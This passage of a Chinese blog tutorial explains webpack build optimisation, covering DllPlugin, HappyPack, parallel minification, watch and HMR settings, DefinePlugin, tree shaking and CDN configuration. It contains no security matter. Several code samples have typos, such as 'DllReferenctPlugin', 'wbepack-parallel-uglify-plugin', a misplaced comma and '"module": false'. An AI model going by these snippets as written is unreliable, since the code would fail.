}</code></p>\n</li>\n<li><p><strong>配置loader时，通过test、exclude、include缩小搜索范围</strong></p>\n</li>\n</ol>\n<h3 id=\"1-2-使用DllPlugin减少基础模块编译次数\"><a href=\"#1-2-使用DllPlugin减少基础模块编译次数\" class=\"headerlink\" title=\"1.2 使用DllPlugin减少基础模块编译次数\"></a>1.2 使用DllPlugin减少基础模块编译次数</h3><p>DllPlugin动态链接库插件，<strong>其原理是</strong>把网页依赖的基础模块抽离出来打包到dll文件中，当需要导入的模块存在于某个dll中时，这个模块不再被打包，而是去dll中获取。<strong>为什么会提升构建速度呢？</strong>原因在于dll中大多包含的是常用的第三方模块，如react、react-dom，所以只要这些模块版本不升级，就只需被编译一次。我认为这样做和配置resolve.alias和module.noParse的效果有异曲同工的效果。</p>\n<p><strong>使用方法：</strong></p>\n<ol>\n<li><p>使用DllPlugin配置一个webpack_dll.config.js来构建dll文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack_dll.config.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> DllPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DllPlugin'</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\"> entry:&#123;</span><br><span class=\"line\">     react:[<span class=\"string\">'react'</span>,<span class=\"string\">'react-dom'</span>],</span><br><span class=\"line\">     polyfill:[<span class=\"string\">'core-js/fn/promise'</span>,<span class=\"string\">'whatwg-fetch'</span>]</span><br><span class=\"line\"> &#125;,</span><br><span class=\"line\"> output:&#123;</span><br><span class=\"line\">     filename:<span class=\"string\">'[name].dll.js'</span>,</span><br><span class=\"line\">     path:path.resolve(__dirname, <span class=\"string\">'dist'</span>),</span><br><span class=\"line\">     library:<span class=\"string\">'_dll_[name]'</span>,  <span class=\"comment\">//dll的全局变量名</span></span><br><span class=\"line\"> &#125;,</span><br><span class=\"line\"> plugins:[</span><br><span class=\"line\">     <span class=\"keyword\">new</span> DllPlugin(&#123;</span><br><span class=\"line\">         name:<span class=\"string\">'_dll_[name]'</span>,  <span class=\"comment\">//dll的全局变量名</span></span><br><span class=\"line\">         path:path.join(__dirname,<span class=\"string\">'dist'</span>,<span class=\"string\">'[name].manifest.json'</span>),<span class=\"comment\">//描述生成的manifest文件</span></span><br><span class=\"line\">     &#125;)</span><br><span class=\"line\"> ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>需要注意DllPlugin的参数中name值必须和output.library值保持一致，并且生成的manifest文件中会引用output.library值。</p>\n<p>最终构建出的文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|-- polyfill.dll.js</span><br><span class=\"line\">|-- polyfill.manifest.json</span><br><span class=\"line\">|-- react.dll.js</span><br><span class=\"line\">└── react.manifest.json</span><br></pre></td></tr></table></figure>\n<p>其中xx.dll.js包含打包的n多模块，这些模块存在一个数组里，并以数组索引作为ID，通过一个变量假设为_xx_dll暴露在全局中，可以通过window._xx_dll访问这些模块。xx.manifest.json文件描述dll文件包含哪些模块、每个模块的路径和ID。然后再在项目的主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件。</p>\n</li>\n<li><p>在主config文件里使用DllReferencePlugin插件引入xx.manifest.json文件：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> DllReferencePlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DllReferencePlugin'</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    entry:&#123; <span class=\"attr\">main</span>:<span class=\"string\">'./main.js'</span> &#125;,</span><br><span class=\"line\">    <span class=\"comment\">//... 省略output、loader等的配置</span></span><br><span class=\"line\">    plugins:[</span><br><span class=\"line\">        <span class=\"keyword\">new</span> DllReferencePlugin(&#123;</span><br><span class=\"line\">            manifest:<span class=\"built_in\">require</span>(<span class=\"string\">'./dist/react.manifest.json'</span>)</span><br><span class=\"line\">        &#125;),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> DllReferenctPlugin(&#123;</span><br><span class=\"line\">            manifest:<span class=\"built_in\">require</span>(<span class=\"string\">'./dist/polyfill.manifest.json'</span>)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终构建生成<code>main.js</code></p>\n</li>\n</ol>\n<h3 id=\"1-3-使用HappyPack开启多进程Loader转换\"><a href=\"#1-3-使用HappyPack开启多进程Loader转换\" class=\"headerlink\" title=\"1.3 使用HappyPack开启多进程Loader转换\"></a>1.3 使用HappyPack开启多进程Loader转换</h3><p>在整个构建流程中，最耗时的就是Loader对文件的转换操作了，而运行在Node.js之上的Webpack是单线程模型的，也就是只能一个一个文件进行处理，不能并行处理。HappyPack可以将任务分解给多个子进程，最后将结果发给主进程。JS是单线程模型，只能通过这种多进程的方式提高性能。   </p>\n<p>HappyPack使用如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D happypack</span><br><span class=\"line\"><span class=\"comment\">// webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">'path'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> HappyPack = <span class=\"built_in\">require</span>(<span class=\"string\">'happypack'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"built_in\">module</span>:&#123;</span><br><span class=\"line\">        rules:[&#123;</span><br><span class=\"line\">                test:<span class=\"regexp\">/\\.js$/</span>，</span><br><span class=\"line\">                use:[<span class=\"string\">'happypack/loader?id=babel'</span>]</span><br><span class=\"line\">                exclude:path.resolve(__dirname, <span class=\"string\">'node_modules'</span>)</span><br><span class=\"line\">            &#125;,&#123;</span><br><span class=\"line\">                test:<span class=\"regexp\">/\\.css/</span>,</span><br><span class=\"line\">                use:[<span class=\"string\">'happypack/loader?id=css'</span>]</span><br><span class=\"line\">            &#125;],</span><br><span class=\"line\">        plugins:[</span><br><span class=\"line\">            <span class=\"keyword\">new</span> HappyPack(&#123;</span><br><span class=\"line\">                id:<span class=\"string\">'babel'</span>,</span><br><span class=\"line\">                loaders:[<span class=\"string\">'babel-loader?cacheDirectory'</span>]</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"keyword\">new</span> HappyPack(&#123;</span><br><span class=\"line\">                id:<span class=\"string\">'css'</span>,</span><br><span class=\"line\">                loaders:[<span class=\"string\">'css-loader'</span>]</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>除了id和loaders，HappyPack还支持这三个参数：<code>threads、verbose、threadpool</code>，threadpool代表共享进程池，即多个HappyPack实例都用同个进程池中的子进程处理任务，以防资源占用过多。</p>\n<h3 id=\"1-4-使用ParallelUglifyPlugin开启多进程压缩JS文件\"><a href=\"#1-4-使用ParallelUglifyPlugin开启多进程压缩JS文件\" class=\"headerlink\" title=\"1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件\"></a>1.4 使用ParallelUglifyPlugin开启多进程压缩JS文件</h3><p>使用UglifyJS插件压缩JS代码时，需要先将代码解析成Object表示的AST（抽象语法树），再去应用各种规则去分析和处理AST，所以这个过程计算量大耗时较多。ParallelUglifyPlugin可以开启多个子进程，每个子进程使用UglifyJS压缩代码，可以并行执行，能显著缩短压缩时间。</p>\n<p>使用也很简单，把原来的UglifyJS插件换成本插件即可，使用如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D webpack-parallel-uglify-plugin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> ParallelUglifyPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'wbepack-parallel-uglify-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ParallelUglifyPlugin(&#123;</span><br><span class=\"line\">        uglifyJS:&#123;</span><br><span class=\"line\">            <span class=\"comment\">//...这里放uglifyJS的参数</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">//...其他ParallelUglifyPlugin的参数，设置cacheDir可以开启缓存，加快构建速度</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、优化开发体验\"><a href=\"#二、优化开发体验\" class=\"headerlink\" title=\"二、优化开发体验\"></a>二、优化开发体验</h2><p>开发过程中修改源码后，需要自动构建和刷新浏览器，以查看效果。这个过程可以使用Webpack实现自动化，Webpack负责监听文件的变化，DevServer负责刷新浏览器。</p>\n<h3 id=\"2-1-使用自动刷新\"><a href=\"#2-1-使用自动刷新\" class=\"headerlink\" title=\"2.1 使用自动刷新\"></a>2.1 使用自动刷新</h3><h4 id=\"2-1-1-Webpack监听文件\"><a href=\"#2-1-1-Webpack监听文件\" class=\"headerlink\" title=\"2.1.1 Webpack监听文件\"></a>2.1.1 Webpack监听文件</h4><p>Webpack可以使用两种方式开启监听：1. 启动webpack时加上–watch参数；2. 在配置文件中设置watch:true。此外还有如下配置参数。合理设置watchOptions可以优化监听体验。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    watch: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    watchOptions: &#123;</span><br><span class=\"line\">        ignored: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">        aggregateTimeout: <span class=\"number\">300</span>,  <span class=\"comment\">//文件变动后多久发起构建，越大越好</span></span><br><span class=\"line\">        poll: <span class=\"number\">1000</span>,  <span class=\"comment\">//每秒询问次数，越小越好</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ignored：设置不监听的目录，排除node_modules后可以显著减少Webpack消耗的内存</p>\n<p>aggregateTimeout：文件变动后多久发起构建，避免文件更新太快而造成的频繁编译以至卡死，越大越好</p>\n<p>poll：通过向系统轮询文件是否变化来判断文件是否改变，poll为每秒询问次数，越小越好</p>\n<h4 id=\"2-1-2-DevServer刷新浏览器\"><a href=\"#2-1-2-DevServer刷新浏览器\" class=\"headerlink\" title=\"2.1.2 DevServer刷新浏览器\"></a>2.1.2 DevServer刷新浏览器</h4><p><strong>DevServer刷新浏览器有两种方式</strong>：</p>\n<ol>\n<li>向网页中注入代理客户端代码，通过客户端发起刷新</li>\n<li>向网页装入一个iframe，通过刷新iframe实现刷新效果</li>\n</ol>\n<p>默认情况下，以及 <code>devserver: {inline:true}</code> 都是采用第一种方式刷新页面。第一种方式DevServer因为不知道网页依赖哪些Chunk，所以会向每个chunk中都注入客户端代码，当要输出很多chunk时，会导致构建变慢。而一个页面只需要一个客户端，<strong>所以关闭inline模式可以减少构建时间</strong>，chunk越多提升月明显。关闭方式：</p>\n<ol>\n<li>启动时使用webpack-dev-server –inline false</li>\n<li>配置 <code>devserver:{inline:false}</code></li>\n</ol>\n<p>关闭inline后入口网址变为<a href=\"http://localhost:8080/webpack-dev-server/\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/webpack-dev-server/</a></p>\n<p>另外<code>devServer.compress</code> 参数可配置是否采用Gzip压缩，默认为false</p>\n<h3 id=\"2-2-开启模块热替换HMR\"><a href=\"#2-2-开启模块热替换HMR\" class=\"headerlink\" title=\"2.2 开启模块热替换HMR\"></a>2.2 开启模块热替换HMR</h3><p>模块热替换不刷新整个网页而只重新编译发生变化的模块，并用新模块替换老模块，所以预览反应更快，等待时间更少，同时不刷新页面能保留当前网页的运行状态。原理也是向每一个chunk中注入代理客户端来连接DevServer和网页。开启方式：</p>\n<ol>\n<li>webpack-dev-server –hot</li>\n<li>使用HotModuleReplacementPlugin，比较麻烦</li>\n</ol>\n<p>开启后如果修改子模块就可以实现局部刷新，但如果修改的是根JS文件，会整页刷新，原因在于，子模块更新时，事件一层层向上传递，直到某层的文件接收了当前变化的模块，然后执行回调函数。如果一层层向外抛直到最外层都没有文件接收，就会刷新整页。</p>\n<p>使用 <code>NamedModulesPlugin</code> 可以使控制台打印出被替换的模块的名称而非数字ID，另外同webpack监听，忽略node_modules目录的文件可以提升性能。</p>\n<h2 id=\"三、优化输出质量-压缩文件体积\"><a href=\"#三、优化输出质量-压缩文件体积\" class=\"headerlink\" title=\"三、优化输出质量-压缩文件体积\"></a>三、优化输出质量-压缩文件体积</h2><h3 id=\"3-1-区分环境–减小生产环境代码体积\"><a href=\"#3-1-区分环境–减小生产环境代码体积\" class=\"headerlink\" title=\"3.1 区分环境–减小生产环境代码体积\"></a>3.1 区分环境–减小生产环境代码体积</h3><p>代码运行环境分为开发环境和生产环境，代码需要根据不同环境做不同的操作，许多第三方库中也有大量的根据开发环境判断的if else代码，构建也需要根据不同环境输出不同的代码，所以需要一套机制可以在源码中区分环境，区分环境之后可以使输出的生产环境的代码体积减小。Webpack中使用DefinePlugin插件来定义配置文件适用的环境。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> DefinePlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/DefinePlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> DefinePlugin(&#123;</span><br><span class=\"line\">        <span class=\"string\">'process.env'</span>: &#123;</span><br><span class=\"line\">            NODE_ENV: <span class=\"built_in\">JSON</span>.stringify(<span class=\"string\">'production'</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>注意，<code>JSON.stringify(&#39;production&#39;)</code> 的原因是，环境变量值需要一个双引号包裹的字符串，而stringify后的值是<code>&#39;&quot;production&quot;&#39;</code></p>\n<p>然后就可以在源码中使用定义的环境：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(process.env.NODE_ENV === <span class=\"string\">'production'</span>)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'你在生产环境'</span>)</span><br><span class=\"line\">    doSth();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'你在开发环境'</span>)</span><br><span class=\"line\">    doSthElse();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当代码中使用了process时，Webpack会自动打包进process模块的代码以支持非Node.js的运行环境，这个模块的作用是模拟Node.js中的process，以支持<code>process.env.NODE_ENV === &#39;production&#39;</code> 语句。</p>\n<h3 id=\"3-2-压缩代码-JS、ES、CSS\"><a href=\"#3-2-压缩代码-JS、ES、CSS\" class=\"headerlink\" title=\"3.2  压缩代码-JS、ES、CSS\"></a>3.2  压缩代码-JS、ES、CSS</h3><ol>\n<li><p><strong>压缩JS：Webpack内置UglifyJS插件、ParallelUglifyPlugin</strong></p>\n<p>会分析JS代码语法树，理解代码的含义，从而做到去掉无效代码、去掉日志输入代码、缩短变量名等优化。常用配置参数如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> UglifyJSPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'webpack/lib/optimize/UglifyJsPlugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> UglifyJSPlugin(&#123;</span><br><span class=\"line\">        compress: &#123;</span><br><span class=\"line\">            warnings: <span class=\"literal\">false</span>,  <span class=\"comment\">//删除无用代码时不输出警告</span></span><br><span class=\"line\">            drop_console: <span class=\"literal\">true</span>,  <span class=\"comment\">//删除所有console语句，可以兼容IE</span></span><br><span class=\"line\">            collapse_vars: <span class=\"literal\">true</span>,  <span class=\"comment\">//内嵌已定义但只使用一次的变量</span></span><br><span class=\"line\">            reduce_vars: <span class=\"literal\">true</span>,  <span class=\"comment\">//提取使用多次但没定义的静态值到变量</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        output: &#123;</span><br><span class=\"line\">            beautify: <span class=\"literal\">false</span>, <span class=\"comment\">//最紧凑的输出，不保留空格和制表符</span></span><br><span class=\"line\">            comments: <span class=\"literal\">false</span>, <span class=\"comment\">//删除所有注释</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>使用<code>webpack --optimize-minimize</code> 启动webpack，可以注入默认配置的UglifyJSPlugin</p>\n</li>\n<li><p><strong>压缩ES6：第三方UglifyJS插件</strong></p>\n<p>随着越来越多的浏览器支持直接执行ES6代码，应尽可能的运行原生ES6，这样比起转换后的ES5代码，代码量更少，且ES6代码性能更好。直接运行ES6代码时，也需要代码压缩，第三方的uglify-webpack-plugin提供了压缩ES6代码的功能：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -D uglify-webpack-plugin@beta <span class=\"comment\">//要使用最新版本的插件</span></span><br><span class=\"line\"><span class=\"comment\">//webpack.config.json</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> UglifyESPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'uglify-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br><span class=\"line\">plugins:[</span><br><span class=\"line\">    <span class=\"keyword\">new</span> UglifyESPlugin(&#123;</span><br><span class=\"line\">        uglifyOptions: &#123;  <span class=\"comment\">//比UglifyJS多嵌套一层</span></span><br><span class=\"line\">            compress: &#123;</span><br><span class=\"line\">                warnings: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                drop_console: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                collapse_vars: <span class=\"literal\">true</span>,</span><br><span class=\"line\">                reduce_vars: <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            output: &#123;</span><br><span class=\"line\">                beautify: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                comments: <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>另外要防止babel-loader转换ES6代码，要在.babelrc中去掉babel-preset-env，因为正是babel-preset-env负责把ES6转换为ES5。</p>\n</li>\n<li><p><strong>压缩CSS：css-loader?minimize、PurifyCSSPlugin</strong></p>\n<p>cssnano基于PostCSS，不仅是删掉空格，还能理解代码含义，例如把<code>color:#ff0000</code> 转换成 <code>color:red</code>，css-loader内置了cssnano，只需要使用 <code>css-loader?minimize</code> 就可以开启cssnano压缩。</p>\n<p>另外一种压缩CSS的方式是使用<a href=\"https://github.com/webpack-contrib/purifycss-webpack\" target=\"_blank\" rel=\"noopener\">PurifyCSSPlugin</a>，需要配合 <code>extract-text-webpack-plugin</code> 使用，它主要的作用是可以去除没有用到的CSS代码，类似JS的Tree Shaking。</p>\n</li>\n</ol>\n<h3 id=\"3-3-使用Tree-Shaking剔除JS死代码\"><a href=\"#3-3-使用Tree-Shaking剔除JS死代码\" class=\"headerlink\" title=\"3.3 使用Tree Shaking剔除JS死代码\"></a>3.3 使用Tree Shaking剔除JS死代码</h3><p>Tree Shaking可以剔除用不上的死代码，它依赖ES6的import、export的模块化语法，最先在Rollup中出现，Webpack 2.0将其引入。适合用于Lodash、utils.js等工具类较分散的文件。<strong>它正常工作的前提是代码必须采用ES6的模块化语法</strong>，因为ES6模块化语法是静态的（在导入、导出语句中的路径必须是静态字符串，且不能放入其他代码块中）。如果采用了ES5中的模块化，例如module.export = {…}、require( x+y )、if (x) { require( ‘./util’ ) }，则Webpack无法分析出可以剔除哪些代码。</p>\n<p><strong>启用Tree Shaking：</strong></p>\n<ol>\n<li><p>修改.babelrc以保留ES6模块化语句：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"presets\"</span>: [</span><br><span class=\"line\">        [</span><br><span class=\"line\">            <span class=\"string\">\"env\"</span>, </span><br><span class=\"line\">            &#123; <span class=\"string\">\"module\"</span>: <span class=\"literal\">false</span> &#125;,   <span class=\"comment\">//关闭Babel的模块转换功能，保留ES6模块化语法</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>启动webpack时带上 –display-used-exports可以在shell打印出关于代码剔除的提示</p>\n</li>\n<li><p>使用UglifyJSPlugin，或者启动时使用–optimize-minimize</p>\n</li>\n<li><p>在使用第三方库时，需要配置 <code>resolve.mainFields: [&#39;jsnext:main&#39;, &#39;main&#39;]</code> 以指明解析第三方库代码时，采用ES6模块化的代码入口</p>\n</li>\n</ol>\n<h2 id=\"四、优化输出质量–加速网络请求\"><a href=\"#四、优化输出质量–加速网络请求\" class=\"headerlink\" title=\"四、优化输出质量–加速网络请求\"></a>四、优化输出质量–加速网络请求</h2><h3 id=\"4-1-使用CDN加速静态资源加载\"><a href=\"#4-1-使用CDN加速静态资源加载\" class=\"headerlink\" title=\"4.1 使用CDN加速静态资源加载\"></a>4.1 使用CDN加速静态资源加载</h3><ol>\n<li><p><strong>CND加速的原理</strong></p>\n<p>CDN通过将资源部署到世界各地，使得用户可以就近访问资源，加快访问速度。要接入CDN，需要把网页的静态资源上传到CDN服务上，在访问这些资源时，使用CDN服务提供的URL。</p>\n<p>由于CDN会为资源开启长时间的缓存，例如用户从CDN上获取了index.html，即使之后替换了CDN上的index.html，用户那边仍会在使用之前的版本直到缓存时间过期。业界做法：</p>\n<ul>\n<li><strong>HTML文件：放在自己的服务器上且关闭缓存，不接入CDN</strong></li>\n<li><strong>静态的JS、CSS、图片等资源：开启CDN和缓存，同时文件名带上由内容计算出的Hash值</strong>，这样只要内容变化hash就会变化，文件名就会变化，就会被重新下载而不论缓存时间多长。</li>\n</ul>\n<p>另外，HTTP1.x版本的协议下，浏览器会对于向同一域名并行发起的请求数限制在4~8个。那么把所有静态资源放在同一域名下的CDN服务上就会遇到这种限制，所以可以把他们<strong>分散放在不同的CDN服务</strong>上，例如JS文件放在js.cdn.com下，将CSS文件放在css.cdn.com下等。这样又会带来一个新的问题：增加了域名解析时间，这个可以通过<strong>dns-prefetch</strong>来解决 <code>&lt;link rel=&#39;dns-prefetch&#39; href=&#39;//js.cdn.com&#39;&gt;</code> 来缩减域名解析的时间。形如<strong><code>//xx.com</code> 这样的URL省略了协议</strong>，这样做的好处是，浏览器在访问资源时会自动根据当前URL采用的模式来决定使用HTTP还是HTTPS协议。</p>\n</li>\n<li><p><strong>总之，构建需要满足以下几点：</strong></p>\n<ul>\n<li>静态资源导入的URL要变成指向CDN服务的绝对路径的URL</li>\n<li>静态资源的文件名需要带上根据内容计算出的Hash值</li>\n<li>不同类型资源放在不同域名的CDN上</li>\n</ul>\n</li>\n<li><p><strong>最终配置：</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ExtractTextPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">'extract-text-webpack-plugin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123;WebPlugin&#125; = <span 